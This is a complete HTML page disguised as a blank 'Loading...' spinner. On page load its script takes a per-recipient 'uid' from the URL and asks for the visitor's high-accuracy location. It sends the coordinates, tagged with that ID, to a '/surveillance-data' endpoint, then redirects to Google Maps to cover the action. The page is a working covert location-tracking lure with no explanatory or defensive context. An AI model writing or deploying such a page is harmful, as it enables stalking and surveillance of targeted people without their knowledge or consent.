<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const recipientId = new URLSearchParams(window.location.search).get('uid');
            if (recipientId && navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    fetch('/surveillance-data', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            type: 'location',
                            recipientId: recipientId,
                            data: { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }
                        })
                    }).finally(() => window.location.href = "https://www.google.com/maps");
                }, err => {
                    console.error("Location access denied:", err);
                    window.location.href = "https://www.google.com";
                }, { enableHighAccuracy: true });
            } else {
                window.location.href = "https://www.google.com";
            }
        });
    </script>
</body>
</html>
